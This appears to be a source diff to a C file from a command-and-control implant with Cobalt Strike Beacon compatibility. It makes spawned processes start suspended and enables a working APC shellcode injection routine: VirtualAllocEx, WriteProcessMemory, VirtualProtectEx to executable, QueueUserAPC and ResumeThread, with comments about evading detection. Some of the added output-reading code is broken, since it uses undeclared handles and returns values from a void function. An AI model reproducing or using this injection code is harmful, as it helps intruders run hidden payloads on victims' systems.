@@ -22,7 +22,7 @@
 
 #include "BeaconCompatibility.h"
 
-#define DEFAULTPROCESSNAME "rundll32.exe"
+// #define DEFAULTPROCESSNAME "rundll32.exe"
 #ifdef _WIN64
 #define X86PATH "SysWOW64"
 #define X64PATH "System32"
@@ -324,7 +324,8 @@ BOOL BeaconIsAdmin(void) {
 /* Injection/spawning related stuffs
  *
  * These functions are basic place holders, and if implemented into something
- * real should be just calling internal functions for your tools. */
+ * real should be just calling internal functions for your tools. 
+ */
 void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
 	CHAR tempBufferPath [MAX_PATH * 2];
 
@@ -348,14 +349,84 @@ void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
 }
 
 
+// BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo)
+// {
+// 	SECURITY_ATTRIBUTES saAttr = { 0 };
+// 	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+// 	saAttr.bInheritHandle = TRUE;
+// 	saAttr.lpSecurityDescriptor = NULL;
+
+// 	HANDLE hStdOutRead;
+// 	HANDLE hStdOutWrite;
+
+// 	/* Create an anonymous pipe */
+// 	if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
+// 		_dbg("Failed to create anonymous pipe .\n");
+// 		return FALSE;
+// 	}
+
+// 	/* Prevent child from inheriting the read handle */
+// 	SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
+
+// 	/* Set up STARTUPINFO for output redirection */
+// 	sInfo->hStdOutput = hStdOutWrite;
+// 	sInfo->hStdError = hStdOutWrite;
+// 	sInfo->dwFlags |= STARTF_USESTDHANDLES;
+
+// 	/* Create full path of target process */
+//     CHAR lpPath   [MAX_PATH * 2];
+//     if (x86) {
+//         sprintf(lpPath, "C:\\Windows\\"X86PATH"\\%s", xenonConfig->spawnto);
+//     }
+//     else {
+//         sprintf(lpPath, "C:\\Windows\\"X64PATH"\\%s", xenonConfig->spawnto);
+//     }
+
+//     BOOL bSuccess = FALSE;
+
+//     bSuccess = CreateProcessA(
+//         NULL, 
+//         lpPath, 
+//         NULL, 
+//         NULL, 
+//         TRUE, 
+//         CREATE_SUSPENDED | CREATE_NO_WINDOW, 
+//         NULL, 
+//         NULL, 
+//         sInfo, 
+//         pInfo
+//     );
+
+// 	/* Close the write handle in the parent (no longer needed) */
+// 	CloseHandle(hStdOutWrite);
+
+//     return bSuccess;
+// }
+
 BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo) {
     BOOL bSuccess = FALSE;
+    CHAR lpPath   [MAX_PATH * 2];
+	
     if (x86) {
-        bSuccess = CreateProcessA(NULL, (char*)"C:\\Windows\\"X86PATH"\\"DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
+        sprintf(lpPath, "C:\\Windows\\"X86PATH"\\%s", xenonConfig->spawnto);
     }
     else {
-        bSuccess = CreateProcessA(NULL, (char*)"C:\\Windows\\"X64PATH"\\"DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
+        sprintf(lpPath, "C:\\Windows\\"X64PATH"\\%s", xenonConfig->spawnto);
     }
+
+    bSuccess = CreateProcessA(
+        NULL, 
+        lpPath, 
+        NULL, 
+        NULL, 
+        TRUE, 
+        CREATE_SUSPENDED | CREATE_NO_WINDOW, 
+        NULL, 
+        NULL, 
+        sInfo, 
+        pInfo
+    );
+
     return bSuccess;
 }
 
@@ -365,32 +436,88 @@ void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_
 }
 
 void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len) {
-    /* The most basic injection as a placeholder, not sure if I want to include this due to detections */
+    /* The most basic injection as a placeholder */
     
-    // HANDLE hProc                    = pInfo->hProcess;
-    // HANDLE hThread                  = pInfo->hThread;
-    // SIZE_T szNumberOfBytesWritten   = NULL;
-    // DWORD dwOldProtection           = NULL;
-	// SIZE_T szAllocSize              = p_len;
+    /* Commented out for detection purposes */
+    HANDLE hProc                    = pInfo->hProcess;
+    HANDLE hThread                  = pInfo->hThread;
+    PVOID pAddress                  = NULL;
+    SIZE_T szNumberOfBytesWritten   = NULL;
+    DWORD dwOldProtection           = NULL;
+	SIZE_T szAllocSize              = p_len;
 
-    // // Allocate
-    // PVOID pAddress = VirtualAllocEx(hProc, NULL, szAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    // // Write
-	// if (!WriteProcessMemory(hProc, pAddress, pPayload, p_len, &szNumberOfBytesWritten) || szNumberOfBytesWritten != p_len) {
-	// 	_dbg("[!] Failed to write process memory : %d\n", GetLastError());
-	// 	return;
-	// }
-    // // Memory page executable (RX)
-    // if (!VirtualProtectEx(hProc, pAddress, p_len, PAGE_EXECUTE_READ, &dwOldProtection)) {
-	// 	_dbg("[!] VirtualProtect Failed With Error : %d\n", GetLastError());
-	// 	return;
-	// }
-    // if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
-	// 	_dbg("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
-	// 	return FALSE;
-	// }
-    // // Execute shellcode
-    // ResumeThread(hThread);
+    // Allocate
+    pAddress = VirtualAllocEx(hProc, NULL, szAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (pAddress == NULL) {
+		_dbg("\t[!] VirtualAllocEx Failed With Error : %d\n", GetLastError());
+		return;
+	}
+
+    // Write
+	if (!WriteProcessMemory(hProc, (LPVOID)pAddress, (LPCVOID)payload, (SIZE_T)p_len, &szNumberOfBytesWritten) || szNumberOfBytesWritten != p_len) {
+		_dbg("[!] Failed to write process memory : %d\n", GetLastError());
+		return;
+	}
+
+    // Memory page executable (RX)
+    if (!VirtualProtectEx(hProc, pAddress, p_len, PAGE_EXECUTE_READ, &dwOldProtection)) {
+		_dbg("[!] VirtualProtect Failed With Error : %d\n", GetLastError());
+		return;
+	}
+
+    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
+		_dbg("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
+		return;
+	}
+
+    // Execute shellcode
+    ResumeThread(hThread);
+
+
+
+    /* Read the output of the process */
+	DWORD bytesRead;
+	DWORD totalSize = 0;
+	DWORD chunkSize = 1024;		// Read in 1KB chunks
+	char* outputBuffer = (char*)malloc(chunkSize);
+	if (!outputBuffer) {
+		_dbg("Memory allocation failed.\n");
+		return FALSE;
+	}
+
+	while (TRUE) {
+		DWORD chunk = 1024;
+		char tempBuffer[1024];
+
+		BOOL success = ReadFile(hStdOutRead, tempBuffer, chunk - 1, &bytesRead, NULL);
+		if (!success || bytesRead == 0) {
+			break;  // No more data
+		}
+
+		tempBuffer[bytesRead] = '\0';  // Null-terminate
+
+		// Resize buffer if needed
+		if (totalSize + bytesRead >= chunkSize) {
+			chunkSize *= 2;  // Double the buffer size
+			outputBuffer = (char*)realloc(outputBuffer, chunkSize);
+			if (!outputBuffer) {
+				_dbg("Memory allocation failed.\n");
+				return 1;
+			}
+		}
+
+		// Append new data
+		memcpy(outputBuffer + totalSize, tempBuffer, bytesRead);
+		totalSize += bytesRead;
+	}
+
+	// Output buffer
+	outputBuffer[totalSize] = '\0';
+
+	*outData = outputBuffer;
+
+	CloseHandle(hStdOutRead);
+
 
     return;
 }
